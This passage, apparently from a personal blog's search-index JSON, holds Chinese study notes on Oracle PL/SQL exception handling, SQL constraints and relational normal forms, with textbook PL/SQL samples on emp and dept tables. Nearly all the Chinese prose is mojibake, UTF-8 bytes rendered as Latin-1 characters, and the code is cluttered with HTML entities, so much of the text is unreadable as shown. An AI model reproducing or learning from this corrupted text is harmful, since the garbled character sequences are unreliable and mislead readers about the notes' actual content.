æ³•æ•è·çš„ï¼Œè§£å†³æ–¹æ³•å’Œå£°æ˜éƒ¨åˆ†ä¸€æ ·ï¼Œéœ€è¦åœ¨å¤–å±‚è¿›è¡Œæ•è·ã€‚ å¼‚å¸¸é”™è¯¯æ¯ä¸ªå¼‚å¸¸é”™è¯¯éƒ½åŒ…å«å¼‚å¸¸é”™è¯¯å·ï¼ˆé”™è¯¯ä»£ç ï¼‰å’Œé”™è¯¯æè¿°ä¿¡æ¯ é”™è¯¯ä»£ç ï¼ˆé”™è¯¯ä»£ç ï¼‰ é”™è¯¯æè¿°ä¿¡æ¯ ORA-00001 è¿åå”¯ä¸€çº¦æŸæ¡ä»¶ ORA-00017 è¯·æ±‚ä¼šè¯ä»¥è®¾ç½®è·Ÿè¸ªäº‹ä»¶ ORA-00018 è¶…å‡ºæœ€å¤§ä¼šè¯æ•° ORA-00019 è¶…å‡ºæœ€å¤§ä¼šè¯è®¸å¯æ•° ORA-00020 è¶…å‡ºæœ€å¤§è¿›ç¨‹æ•° () ORA-00021 ä¼šè¯é™„å±äºå…¶å®ƒæŸäº›è¿›ç¨‹ï¼›æ— æ³•è½¬æ¢ä¼šè¯ ORA-00022 æ— æ•ˆçš„ä¼šè¯ IDï¼›è®¿é—®è¢«æ‹’ç» ORA-00023 ä¼šè¯å¼•ç”¨è¿›ç¨‹ç§ç”¨å†…å­˜ï¼›æ— æ³•åˆ†ç¦»ä¼šè¯ ORA-00024 å•ä¸€è¿›ç¨‹æ¨¡å¼ä¸‹ä¸å…è®¸ä»å¤šä¸ªè¿›ç¨‹æ³¨å†Œ é¢„å®šä¹‰çš„å¼‚å¸¸å¤„ç† é”™è¯¯å· å¼‚å¸¸åç§° è¯´æ˜ ORA-0001 DUP_VAL_ON_INDEX è¯•å›¾ç ´åä¸€ä¸ªå”¯ä¸€æ€§é™åˆ¶ ORA-0051 TIMEOUT_ON_RESOURCE åœ¨ç­‰å¾…èµ„æºæ—¶å‘ç”Ÿè¶…æ—¶ ORA-0061 TRANSACTION_BACKED_OUT ç”±äºå‘ç”Ÿæ­»é”äº‹åŠ¡è¢«æ’¤æ¶ˆ ORA-1001 INVALID_CURSOR è¯•å›¾ä½¿ç”¨ä¸€ä¸ªæœªæ‰“å¼€çš„æ¸¸æ ‡ ORA-1012 NOT_LOGGED_ON æ²¡æœ‰è¿æ¥åˆ°ORACLE ORA-1017 LOGIN_DENIED æ— æ•ˆçš„ç”¨æˆ·å/å£ä»¤ ORA-1403 NO_DATA_FOUND SELECT INTOæ²¡æœ‰æ‰¾åˆ°æ•°æ® ORA-1422 TOO_MANY_ROWS SELECT INTO è¿”å›å¤šè¡Œ ORA-1476 ZERO_DIVIDE è¯•å›¾è¢«é›¶é™¤ ORA-1722 INVALID_NUMBER è½¬æ¢ä¸€ä¸ªæ•°å­—å¤±è´¥ ORA-6500 STORAGE_ERROR å†…å­˜ä¸å¤Ÿæˆ–å†…å­˜è¢«ç ´åå¼•å‘çš„å†…éƒ¨é”™è¯¯ ORA-6501 PROGRAM_ERROR å†…éƒ¨é”™è¯¯,éœ€é‡æ–°å®‰è£…æ•°æ®å­—å…¸è§†å›¾å’Œpl/sqlåŒ… ORA-6502 VALUE_ERROR èµ‹å€¼æ“ä½œï¼Œå˜é‡é•¿åº¦ä¸è¶³ï¼Œè§¦å‘è¯¥å¼‚å¸¸ ORA-6504 ROWTYPE_MISMATCH å®¿ä¸»æ¸¸æ ‡å˜é‡ä¸ PL/SQLå˜é‡æœ‰ä¸å…¼å®¹è¡Œç±»å‹ ORA-6511 CURSOR_ALREADY_OPEN è¯•å›¾æ‰“å¼€ä¸€ä¸ªå·²æ‰“å¼€çš„æ¸¸æ ‡ ORA-6530 ACCESS_INTO_NULL è¯•å›¾ä¸ºnull å¯¹è±¡çš„å±æ€§èµ‹å€¼ ORA-6531 COLLECTION_IS_NULL è¯•å›¾ç»™æ²¡æœ‰åˆå§‹åŒ–çš„åµŒå¥—è¡¨å˜é‡æˆ–è€…varryå˜é‡èµ‹å€¼ ORA-6532 SUBSCRIPT_OUTSIDE_LIMIT å¯¹åµŒå¥—æˆ–varrayç´¢å¼•ä½¿ç”¨äº†è´Ÿæ•° ORA-6533 SUBSCRIPT_BEYOND_COUNT å¯¹åµŒå¥—æˆ–varrayç´¢å¼•çš„å¼•ç”¨å¤§äºé›†åˆä¸­å…ƒç´ çš„ä¸ªæ•° ORA-6592 CASE_NOT_FOUND å½“Caseè¯­å¥çš„Whenå­å¥æ²¡æœ‰åŒ…å«å¿…éœ€åˆ†æ”¯æˆ–è€…Elseå­å¥æ—¶ï¼Œä¼šè§¦å‘è¯¥å¼‚å¸¸ã€‚ ORA-30625 SELF_IS_NULL è¯•å›¾åœ¨nullå®ä¾‹ä¸Šè°ƒç”¨æˆå‘˜æ–¹æ³• ORA-1410 SYS_INVALID_ROWID è¯•å›¾å°†æ— æ•ˆçš„å­—ç¬¦ä¸²è½¬åŒ–æˆROWID å¯¹äºé¢„å®šä¹‰å¼‚å¸¸æƒ…å†µçš„å¤„ç†ï¼Œåªéœ€åœ¨PL/SQLå—çš„å¼‚å¸¸å¤„ç†éƒ¨åˆ†ï¼Œç›´æ¥å¼•ç”¨ç›¸åº”çš„å¼‚å¸¸æƒ…å†µåï¼Œå¹¶å¯¹å…¶å®Œæˆç›¸åº”çš„å¼‚å¸¸é”™è¯¯å¤„ç†å³å¯ã€‚ ç¤ºä¾‹1234567891011121314151617181920--ä¾‹ï¼š æ›´æ–°æŒ‡å®šå‘˜å·¥å·¥èµ„ï¼Œå¦‚å·¥èµ„å°äº1500ï¼Œåˆ™åŠ 100 DECLARE v_empno emp.empno%TYPE :&#x3D;7900; v_sal emp.sal%TYPE; BEGIN SELECT sal INTO v_sal FROM emp WHERE empno&#x3D;v_empno; IF v_sal&lt;&#x3D;1500 THEN UPDATE emp SET sal&#x3D;sal+100 WHERE empno&#x3D;v_empno; DBMS_OUTPUT.PUT_LINE(&#39;ç¼–ç ä¸º&#39;||v_empno||&#39;å‘˜å·¥å·¥èµ„å·²æ›´æ–°!&#39;); ELSE DBMS_OUTPUT.PUT_LINE(&#39;ç¼–ç ä¸º&#39;||v_empno||&#39;å‘˜å·¥å·¥èµ„å·²ç»è¶…è¿‡è§„å®šå€¼!&#39;); END IF; EXCEPTION WHEN NO_DATA_FOUND THEN DBMS_OUTPUT.PUT_LINE(&#39;æ•°æ®åº“ä¸­æ²¡æœ‰ç¼–ç ä¸º&#39;||v_empno||&#39;çš„å‘˜å·¥&#39;); WHEN TOO_MANY_ROWS THEN DBMS_OUTPUT.PUT_LINE(&#39;ç¨‹åºè¿è¡Œé”™è¯¯!è¯·ä½¿ç”¨æ¸¸æ ‡&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||â€™---â€˜||SQLERRM); END; éé¢„å®šä¹‰çš„å¼‚å¸¸å¤„ç†é¢„å®šä¹‰çš„å¼‚å¸¸é”™è¯¯å¤§çº¦æœ‰24ä¸ªï¼Œè€Œé”™è¯¯ä»£ç æˆåƒä¸Šä¸‡å¦‚ORA-00020 ã€‚ å¯¹äºè¿™ç±»å¼‚å¸¸æƒ…å†µçš„å¤„ç†ï¼Œé¦–å…ˆå¿…é¡»å¯¹éå®šä¹‰çš„ORACLEé”™è¯¯è¿›è¡Œå®šä¹‰ æ­¥éª¤å¦‚ä¸‹ï¼š åœ¨PL/SQL å—çš„å£°æ˜éƒ¨åˆ†å®šä¹‰å¼‚å¸¸æƒ…å†µï¼š &lt;å¼‚å¸¸æƒ…å†µ&gt; EXCEPTION; å°†å…¶å®šä¹‰å¥½çš„å¼‚å¸¸æƒ…å†µï¼Œä¸æ ‡å‡†çš„ORACLEé”™è¯¯è”ç³»èµ·æ¥ï¼Œä½¿ç”¨EXCEPTION_INITè¯­å¥ PRAGMA EXCEPTION_INIT(&lt;å¼‚å¸¸æƒ…å†µ&gt;, &lt;é”™è¯¯ä»£ç &gt;)ï¼› åœ¨PL/SQL å—çš„å¼‚å¸¸æƒ…å†µå¤„ç†éƒ¨åˆ†å¯¹å¼‚å¸¸æƒ…å†µåšå‡ºç›¸åº”çš„å¤„ç†ã€‚ ç¤ºä¾‹1234567891011121314--ä¾‹ï¼šåˆ é™¤æŒ‡å®šéƒ¨é—¨çš„è®°å½•ä¿¡æ¯ï¼Œä»¥ç¡®ä¿è¯¥éƒ¨é—¨æ²¡æœ‰å‘˜å·¥ã€‚ DECLARE v_deptno dept.deptno%TYPE :&#x3D;&amp;deptno; deptno_remaining EXCEPTION; PRAGMA EXCEPTION_INIT(deptno_remaining, -2292); &#x2F;* -2292 æ˜¯è¿åreferenceså®Œæ•´æ€§çº¦æŸçš„é”™è¯¯ä»£ç  *&#x2F; BEGIN DELETE FROM dept WHERE deptno&#x3D;v_deptno; EXCEPTION WHEN deptno_remaining THEN DBMS_OUTPUT.PUT_LINE(&#39;è¿åæ•°æ®å®Œæ•´æ€§çº¦æŸ!&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||â€™---â€˜||SQLERRM); END; ç”¨æˆ·è‡ªå®šä¹‰çš„å¼‚å¸¸å¤„ç†å½“ä¸ä¸€ä¸ªå¼‚å¸¸é”™è¯¯ç›¸å…³çš„é”™è¯¯å‡ºç°æ—¶ï¼Œå°±ä¼šéšå«è§¦å‘è¯¥å¼‚å¸¸é”™è¯¯ã€‚ç”¨æˆ·å®šä¹‰çš„å¼‚å¸¸é”™è¯¯æ˜¯é€šè¿‡æ˜¾å¼ä½¿ç”¨ RAISE è¯­å¥æ¥è§¦å‘ã€‚å½“å¼•å‘ä¸€ä¸ªå¼‚å¸¸é”™è¯¯æ—¶ï¼Œæ§åˆ¶å°±è½¬å‘åˆ° EXCEPTIONå—å¼‚å¸¸é”™è¯¯éƒ¨åˆ†ï¼Œæ‰§è¡Œé”™è¯¯å¤„ç†ä»£ç ã€‚ æ­¥éª¤å¦‚ä¸‹ ï¼š åœ¨PL/SQL å—çš„å£°æ˜éƒ¨åˆ†å®šä¹‰å¼‚å¸¸æƒ…å†µ ï¼š &lt;å¼‚å¸¸æƒ…å†µ&gt; EXCEPTION; RAISE &lt;å¼‚å¸¸æƒ…å†µ&gt; åœ¨PL/SQL å—çš„å¼‚å¸¸æƒ…å†µå¤„ç†éƒ¨åˆ†å¯¹å¼‚å¸¸æƒ…å†µåšå‡ºç›¸åº”çš„å¤„ç†ã€‚ ç¤ºä¾‹123456789101112131415--ä¾‹DECLARE v_empno emp.empno%TYPE :&#x3D;&amp;empno; no_result EXCEPTION; BEGIN UPDATE emp SET sal&#x3D;sal+100 WHERE empno&#x3D;v_empno; IF SQL%NOTFOUND THEN RAISE no_result; END IF; EXCEPTION WHEN no_result THEN DBMS_OUTPUT.PUT_LINE(&#39;ä½ çš„æ•°æ®æ›´æ–°è¯­å¥å¤±è´¥äº†!&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||â€™---â€˜||SQLERRM); END; RAISE_APPLICATION_ERRORå‡½æ•°è°ƒç”¨DBMS_STANDARD(ORACLEæä¾›çš„åŒ…)åŒ…æ‰€å®šä¹‰çš„RAISE_APPLICATION_ERRORè¿‡ç¨‹ï¼Œå¯ä»¥é‡æ–°å®šä¹‰å¼‚å¸¸é”™è¯¯æ¶ˆæ¯ï¼Œå®ƒä¸ºåº”ç”¨ç¨‹åºæä¾›äº†ä¸€ç§ä¸ORACLEäº¤äº’çš„æ–¹æ³•ã€‚ é”™è¯¯å·çš„èŒƒå›´æ˜¯-20,000åˆ°-20,999ã€‚é”™è¯¯ä¿¡æ¯æ˜¯æ–‡æœ¬å­—ç¬¦ä¸²ï¼Œæœ€å¤šä¸º2048å­—èŠ‚ã€‚ ç¤ºä¾‹123456789101112--ä¾‹ï¼šdeclare v_deptid departments.department_id%type :&#x3D; &amp;no; v_dname departments.department_name%type; begin select department_name into v_dname from departments where department_id &#x3D; v_deptid; dbms_output.put_line(v_dname); exception when others then raise_application_error(-20001 , &#39;department&#39;||v_deptid||&#39; does not exists&#39;); end; å¼‚å¸¸é”™è¯¯ä¼ æ’­ç”±äºå¼‚å¸¸é”™è¯¯å¯ä»¥åœ¨å£°æ˜éƒ¨åˆ†å’Œæ‰§è¡Œéƒ¨åˆ†ä»¥åŠå¼‚å¸¸é”™è¯¯éƒ¨åˆ†å‡ºç°ï¼Œå› è€Œåœ¨ä¸åŒéƒ¨åˆ†å¼•å‘çš„å¼‚å¸¸é”™è¯¯ä¹Ÿä¸ä¸€æ ·ã€‚ å¯æ‰§è¡Œéƒ¨åˆ†äº§ç”Ÿçš„å¼‚å¸¸ï¼š å½“ä¸€ä¸ªå¼‚å¸¸é”™è¯¯åœ¨æ‰§è¡Œéƒ¨åˆ†å¼•å‘æ—¶ï¼Œæœ‰ä¸‹åˆ—æƒ…å†µï¼š å¦‚æœå½“å‰å—å¯¹è¯¥å¼‚å¸¸é”™è¯¯è®¾ç½®äº†å¤„ç†ï¼Œåˆ™æ‰§è¡Œå®ƒå¹¶æˆåŠŸå®Œæˆè¯¥å—çš„æ‰§è¡Œï¼Œç„¶åæ§åˆ¶è½¬ç»™åŒ…å«å—ã€‚ å¦‚æœæ²¡æœ‰å¯¹å½“å‰å—å¼‚å¸¸é”™è¯¯è®¾ç½®å®šä¹‰å¤„ç†å™¨ï¼Œåˆ™é€šè¿‡åœ¨åŒ…å«å—ä¸­å¼•å‘å®ƒæ¥ä¼ æ’­å¼‚å¸¸é”™è¯¯ã€‚ç„¶åå¯¹è¯¥åŒ…å«å—æ‰§è¡Œæ­¥éª¤1)ã€‚ å£°æ˜éƒ¨åˆ†äº§ç”Ÿçš„å¼‚å¸¸ï¼šå¦‚æœåœ¨å£°æ˜éƒ¨åˆ†å¼•èµ· å¼‚å¸¸ æƒ…å†µï¼Œå³åœ¨å£°æ˜éƒ¨åˆ†å‡ºç°é”™è¯¯ï¼Œé‚£ä¹ˆè¯¥é”™è¯¯å°±èƒ½å½±å“åˆ°å…¶å®ƒçš„å— ç¤ºä¾‹12345678910111213141516171819202122232425262728293031--ä¾‹1ï¼šDECLARE Abc number(3):&#x3D;â€™abcâ€™; --å…¶å®ƒè¯­å¥ BEGIN --å…¶å®ƒè¯­å¥ EXCEPTION WHEN OTHERS THEN --å…¶å®ƒè¯­å¥ END; &#x2F;*ç”±äºAbc number(3)&#x3D;â€™abcâ€™; å‡ºé”™ï¼Œå°½ç®¡åœ¨EXCEPTIONä¸­è¯´æ˜äº†WHEN OTHERS THENè¯­å¥ï¼Œä½†WHEN OTHERS THENä¹Ÿä¸ä¼šè¢«æ‰§è¡Œã€‚ *&#x2F;--ä¾‹2ï¼šBEGIN DECLARE Abc number(3):&#x3D;â€™abcâ€™; --å…¶å®ƒè¯­å¥ BEGIN --å…¶å®ƒè¯­å¥ EXCEPTION WHEN OTHERS THEN --å…¶å®ƒè¯­å¥ END; EXCEPTION WHEN OTHERS THEN --å…¶å®ƒè¯­å¥ END; &#x2F;*åœ¨è¯¥é”™è¯¯è¯­å¥å—çš„å¤–éƒ¨æœ‰ä¸€ä¸ªå¼‚å¸¸é”™è¯¯ï¼Œåˆ™è¯¥é”™è¯¯èƒ½è¢«æŠ“ä½*&#x2F; å¼‚å¸¸å¤„ç†çš„SQLCodeå’ŒSQL Errm**æ³¨æ„ï¼š ** æŸç»™å®šå¼‚å¸¸ï¼ˆå¦‚è‡ªå®šä¹‰ï¼‰åªèƒ½åœ¨å¼‚å¸¸å¤„ç†éƒ¨åˆ†çš„å¤„ç†ä¸€æ¬¡ã€‚å¦‚æœæœ‰å¤šä¸ªå¼‚å¸¸å¤„ç†å™¨ï¼ˆå¤šæ¬¡whenï¼‰ï¼Œåˆ™ä¼šæŠ›å‡ºPLS-00483å¼‚å¸¸ã€‚ SQLCODEè¿”å›å½“å‰çš„é”™è¯¯ä»£ç ï¼ŒSQLERRMè¿”å›å½“å‰çš„é”™è¯¯ä¿¡æ¯ã€‚å¯¹äºç”¨æˆ·è‡ªå®šä¹‰å¼‚å¸¸SQLCODEè¿”å›å€¼ä¸ºâ€˜1â€™ï¼ŒSQLERRMè¿”å›å€¼ä¸ºâ€˜User-defined Exceptionâ€™ Oracleé”™è¯¯ä¿¡æ¯çš„æœ€å¤§é•¿åº¦æ˜¯512å­—èŠ‚ SQLCODEå’ŒSQLERRMçš„å€¼å…ˆèµ‹ç»™æœ¬åœ°å˜é‡ï¼Œä¸èƒ½ç›´æ¥ç”¨äºSQLè¯­å¥","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"sqlçº¦æŸ","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/sqlçº¦æŸ/","text":"sqlçº¦æŸ åç§° å…³é”®å­— å«ä¹‰ æ‰€å±çº§åˆ« é»˜è®¤å€¼çº¦æŸ DEFAULT å¯ä»¥ä¸ºæŸä¸€åˆ—æŒ‡å®šé»˜è®¤å€¼ã€‚å½“ç”¨æˆ·æ’å…¥æˆ–ä¿®æ”¹å…ƒç»„æ—¶ï¼Œåœ¨æ²¡æœ‰ä¸ºè¯¥åˆ—èµ‹å€¼çš„æƒ…å†µä¸‹å¯ä»¥ç”¨æŒ‡å®šçš„é»˜è®¤å€¼å¡«å…¥è¯¥åˆ—ã€‚ åˆ—çº§çº¦æŸ éç©ºå€¼çº¦æŸ NOT NULL å½“æŸåˆ—çš„å€¼ä¸èƒ½ä¸ºç©ºå€¼æ—¶ï¼ˆå³è¦æ±‚æ–°å»ºæˆ–ä¿®æ”¹å…ƒç»„æ—¶ï¼Œ ï¼ˆå³è¦æ±‚æ–°å»ºæˆ–ä¿®æ”¹å…ƒç»„æ—¶ï¼Œè¯¥åˆ—å¿…é¡»å¡«å…¥å€¼ï¼‰ï¼Œåˆ™å¯ä»¥åœ¨è®¾ç½®ä¸ºéç©ºå€¼çº¦æŸ åˆ—çº§çº¦æŸ å”¯ä¸€å‹çº¦æŸ UNIQUE ç”¨äºé™å®šåŸºæœ¬è¡¨ä¸Šçš„æŸä¸ªåˆ—æˆ–æŸäº›åˆ—çš„ç»„åˆï¼ˆç§°ä¸ºå”¯ä¸€æ€§é”®ï¼‰ï¼Œåœ¨ä¸åŒå…ƒç»„ï¼ˆè¡Œï¼‰ä¸­çš„å–å€¼ä¸èƒ½ç›¸åŒï¼ˆç©ºå€¼é™¤å¤–ï¼‰ã€‚ å¯ä»¥æ˜¯åˆ—çº§çº¦æŸä¹Ÿå¯ä»¥æ˜¯è¡¨çº§çº¦æŸ ä¸»é”®çº¦æŸ PRIMARY KEY ç”¨äºå®šä¹‰åŸºæœ¬è¡¨çš„ä¸»é”®ï¼ˆç ï¼‰ï¼Œä»¥å®ç°å®ä½“å®Œæ•´æ€§è§„åˆ™ã€‚ å¯ä»¥æ˜¯åˆ—çº§çº¦æŸä¹Ÿå¯ä»¥æ˜¯è¡¨çº§çº¦æŸ å¤–é”®çº¦æŸ FOREIGN KEY æ˜¯ä¸€ä¸ªè¡¨ï¼ˆç§°å¤–é”®è¡¨ã€ä»è¡¨æˆ–å‚ç…§å…³ç³»ï¼‰ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—çš„ç»„åˆï¼Œå®ƒçš„å–å€¼è¦ä¹ˆä¸ºç©ºå€¼ï¼Œè¦ä¹ˆæ˜¯å¼•ç”¨å¦ä¸€ä¸ªè¡¨ï¼ˆç§°ä¸»é”®è¡¨ã€ä¸»è¡¨æˆ–è¢«å‚ç…§å…³ç³»ï¼‰çš„ä¸»é”®æˆ–å”¯ä¸€æ€§é”®çš„å€¼ã€‚ å¯ä»¥æ˜¯åˆ—çº§çº¦æŸä¹Ÿå¯ä»¥æ˜¯è¡¨çº§çº¦æŸ æ£€æŸ¥çº¦æŸ CHECK å¯ä»¥å®šä¹‰æ’å…¥æˆ–ä¿®æ”¹æŸä¸ªå…ƒç»„æ—¶ï¼Œå…ƒç»„åº”æ»¡è¶³çš„çº¦æŸæ¡ä»¶ï¼Œé€šå¸¸ç”¨äºé™å®šæŸä¸ªåˆ—çš„å–å€¼èŒƒå›´æˆ–ä¸å…¶ä»–åˆ—çš„å…³ç³»ã€‚ å¯ä»¥æ˜¯åˆ—çº§çº¦æŸä¹Ÿå¯ä»¥æ˜¯è¡¨çº§çº¦æŸ","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"æ•°æ®åº“å…³ç³»èŒƒå¼","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/æ•°æ®åº“å…³ç³»èŒƒå¼/","text":"æ•°æ®åº“å…³ç³»èŒƒå¼æ•°æ®ä¾èµ–å…³ç³»æ¨¡å¼ä¸­çš„å„å±æ€§ä¹‹é—´ç›¸äº’ä¾èµ–ã€ç›¸äº’åˆ¶çº¦çš„è”ç³»ç§°ä¸ºæ•°æ®ä¾èµ– å‡½æ•°ä¾èµ– å¤šå€¼ä¾èµ– è¿æ¥ä¾èµ– å…³ç³»æ¨¡å¼åº”æ»¡è¶³çš„åŸºæœ¬è¦æ±‚ æ•°æ®åº“ä¸­çš„æ•°æ®å†—ä½™åº”è¯¥å°½å¯èƒ½çš„å°‘ å…³ç³»æ•°æ®åº“ä¸èƒ½å› ä¸ºæ•°æ®æ›´æ–°æ“ä½œè€Œå¼•èµ·æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ æ’å…¥æ•°æ®æ—¶ï¼Œä¸èƒ½äº§ç”Ÿæ’å…¥å¼‚å¸¸ç°è±¡ åˆ é™¤æ•°æ®æ—¶ï¼Œä¸èƒ½äº§ç”Ÿåˆ é™¤å¼‚å¸¸ç°è±¡ æ•°æ®åº“è®¾è®¡åº”è€ƒè™‘æŸ¥è¯¢è¦æ±‚ï¼Œæ•°æ®ç»„ç»‡åº”åˆç† å®Œå…¨å‡½æ•°ä¾èµ–å’Œéƒ¨åˆ†å‡½æ•°ä¾èµ–(Sno,Cno)-&gt;Grade(å®Œå…¨å‡½æ•°ä¾èµ–) å­¦å·å’Œè¯¾ç¨‹å·ç»„æˆé›†åˆæ‰èƒ½ä¸€å®šæ¨å‡ºå”¯ä¸€çš„æˆç»©ï¼Œæ‰€ä»¥(Sno,Cno)ä¸ºå†³å®šå› ç´  å› ä¸ºSno-&gt;Ageæ‰€ä»¥(Sno,Cno)-&gt;Age(éƒ¨åˆ†å‡½æ•°ä¾èµ–) å­¦å·æ˜¯å­¦å·å’Œè¯¾ç¨‹å·ç»„æˆé›†åˆçš„å­é›†,è€Œå­¦å·å°±å¯ä»¥æ¨å‡ºå¹´é¾„,æ‰€ä»¥å¹´é¾„éƒ¨åˆ†å‡½æ•°ä¾èµ–äº(Sno,Cno)è¿™ä¸ªé›†åˆ è¯´æ˜ åªç”¨å½“å†³å®šå› ç´ æ˜¯ç»„åˆå±æ€§æ—¶ï¼Œè®¨è®ºéƒ¨åˆ†å‡½æ•°ä¾èµ–æ‰æœ‰æ„ä¹‰ å½“å†³å®šæ˜¯å•å±æ€§æ—¶ï¼Œåªèƒ½æ˜¯å®Œå…¨å‡½æ•°ä¾èµ– ä¾‹å¦‚ï¼Œåœ¨å…³ç³»æ¨¡å¼Sï¼ˆSNOï¼ŒSNï¼ŒAGEï¼ŒDEPTï¼‰ï¼Œå†³å®šå› ç´ ä¸ºå•å±æ€§SNOï¼Œæœ‰SNO-&gt;ï¼ˆSNï¼ŒAGEï¼ŒDEPTï¼‰ï¼Œä¸å­˜åœ¨éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚ èŒƒå¼ åŸºæœ¬æ€æƒ³ï¼šæ¶ˆé™¤å…³ç³»æ¨¡å¼ä¸­çš„æ•°æ®å†—ä½™ï¼Œæ¶ˆé™¤æ•°æ®ä¾èµ–ä¸­çš„ä¸åˆé€‚çš„éƒ¨åˆ†ï¼Œè§£å†³æ•°æ®æ’å…¥ã€åˆ é™¤æ—¶å‘ç”Ÿå¼‚å¸¸ç°è±¡ èŒƒå¼ï¼šæŠŠå…³ç³»æ•°æ®åº“è®¾è®¡å‡ºæ¥çš„å…³ç³»æ¨¡å¼è¦æ»¡è¶³ä¸€å®šçš„æ¡ä»¶ã€‚ ç¬¬ä¸€èŒƒå¼ï¼šæ»¡è¶³åŸºæœ¬è§„èŒƒè¦æ±‚çš„å…³ç³»æ¨¡å¼ ç¬¬äºŒèŒƒå¼ï¼šåœ¨ç¬¬ä¸€èŒƒå¼ä¸­è¿›ä¸€æ­¥æ»¡è¶³ä¸€äº›è¦æ±‚ ç¬¬ä¸‰èŒƒå¼ï¼šä»¥æ­¤ç±»æ¨äº§ç”Ÿäº†ç¬¬ä¸‰èŒƒå¼ç­‰æ¦‚å¿µ æ³¨æ„ï¼šæ¯ä¸ªèŒƒå¼éƒ½è§„å®šäº†ä¸€äº›é™åˆ¶æ¡ä»¶ ç¬¬ä¸€èŒƒå¼ å®šä¹‰ï¼šå¦‚æœä¸€ä¸ªå…³ç³»æ¨¡å¼Rä¸­çš„æ‰€æœ‰å±æ€§éƒ½æ˜¯ä¸å¯åˆ†çš„æœ€å°æ•°æ®é¡¹ï¼Œåˆ™Râˆˆ1NF æ³¨æ„ï¼š NFæ˜¯å…³ç³»æ¨¡å¼çš„ä¸€ä¸ªæœ€èµ·ç çš„è¦æ±‚ ä¸æ»¡è¶³1NFçš„æ•°æ®åº“æ¨¡å¼ä¸èƒ½ç§°ä¹‹ä¸ºå…³ç³»æ•°æ®åº“ ä½†æ»¡è¶³1NFçš„å…³ç³»æ¨¡å¼ä¸ä¸€å®šæ˜¯å¥½çš„å…³ç³»æ¨¡å¼ ç¬¬äºŒèŒƒå¼ å®šä¹‰ï¼šå¦‚æœå…³ç³»æ¨¡å¼Râˆˆ1NFï¼Œä¸”Rä¸­æ¯ä¸€ä¸ªéä¸»å±æ€§å®Œå…¨å‡½æ•°ä¾èµ–äºç ï¼Œåˆ™Râˆˆ2NF ç»“è®ºï¼š ä»1NFå…³ç³»ä¸­æ¶ˆé™¤éä¸»å±æ€§å¯¹å…³ç³»é”®çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼Œåˆ™å¯å¾—åˆ°2NFå…³ç³» å¦‚æœRçš„å…³ç³»ä¸ºå•å±æ€§ï¼Œæˆ–Rçš„å…¨ä½“å±æ€§å‡ä¸ºä¸»å±æ€§ï¼Œåˆ™Râˆˆ2NF 2NFè§„èŒƒåŒ– 2NFè§„èŒƒåŒ–æ˜¯æŒ‡æŠŠ1NFå…³ç³»æ¨¡å¼é€šè¿‡æŠ•å½±åˆ†è§£è½¬æ¢æˆ2NFå…³ç³»æ¨¡å¼çš„é›†åˆ åˆ†è§£æ—¶éµå¾ªçš„åŸºæœ¬åŸåˆ™å°±æ˜¯â€œä¸€äº‹ä¸€åœ°â€ï¼Œè®©ä¸€ä¸ªå…³ç³»åªæè¿°ä¸€ä¸ªå®ä½“æˆ–è€…å®ä½“é—´çš„è”ç³»ã€‚å¦‚æœå¤šäºä¸€ä¸ªå®ä½“æˆ–è”ç³»ï¼Œåˆ™è¿›è¡ŒæŠ•å½±åˆ†è§£ ç¬¬ä¸‰èŒƒå¼ å®šä¹‰ï¼šå¦‚æœå…³ç³»æ¨¡å¼Râˆˆ2NFï¼Œä¸”Rä¸­æ¯ä¸ªéä¸»å±æ€§éƒ½ä¸ä¼ é€’ä¾èµ–äºç ï¼Œåˆ™Râˆˆ3NF 3NFè§„èŒƒåŒ–ï¼š 3NFæ˜¯æŒ‡æŠŠ2NFå…³ç³»æ¨¡å¼é€šè¿‡æŠ•å½±åˆ†è§£è½¬æ¢æˆ3NFå…³ç³»æ¨¡å¼çš„é›†åˆ å’Œ2NFè§„èŒƒåŒ–æ—¶éµå¾ªçš„åŸåˆ™ç›¸åŒï¼Œå³â€œä¸€äº‹ä¸€åœ°â€ï¼Œè®©ä¸€ä¸ªå…³ç³»åªæè¿°ä¸€ä¸ªå®ä½“æˆ–è€…å®ä½“é—´çš„è”ç³» BCèŒƒå¼ å®šä¹‰ï¼šå…³ç³»æ¨¡å¼R(U,F)âˆˆ1NFï¼Œè‹¥å¯¹Rçš„æ¯ä¸ªå‡½æ•°ä¾èµ–x-&gt;yï¼Œæœ‰xå¿…å«å€™é€‰ç ï¼Œåˆ™RâˆˆBCNF ä¼˜ç‚¹ï¼š æ•°æ®å†—ä½™é™ä½ ä¸å­˜åœ¨æ’å…¥å¼‚å¸¸ ä¸å­˜åœ¨åˆ é™¤å¼‚å¸¸ ä¸å­˜åœ¨æ›´æ–°å¼‚å¸¸ æ€§è´¨ï¼š è‹¥RâˆˆBCNFï¼Œåˆ™Râˆˆ2NF è‹¥RâˆˆBCNFï¼Œåˆ™Râˆˆ3NF è‹¥Râˆˆ3NFï¼Œåˆ™Rä¸ä¸€å®šæ˜¯BCNF è‹¥Râˆˆ3NFï¼Œä¸”å€™é€‰ç å”¯ä¸€ï¼Œåˆ™Ræ˜¯BCNF ç¬¬å››èŒƒå¼ å®šä¹‰ï¼šå…³ç³»æ¨¡å¼R(U,D)âˆˆ1NFï¼ŒUæ˜¯å±æ€§å…¨é›†ï¼Œxï¼Œyæ˜¯Uçš„å­é›†ï¼ŒDæ˜¯Rä¸Šçš„æ•°æ®ä¾èµ–é›†ï¼Œå¦‚æœå¯¹Rçš„æ¯ä¸ªéå¹³å‡¡å¤šå€¼ä¾èµ–X-&gt;-&gt;yï¼Œxéƒ½å«å€™é€‰ç ï¼Œåˆ™Râˆˆ4NFã€‚ 123456789(1) 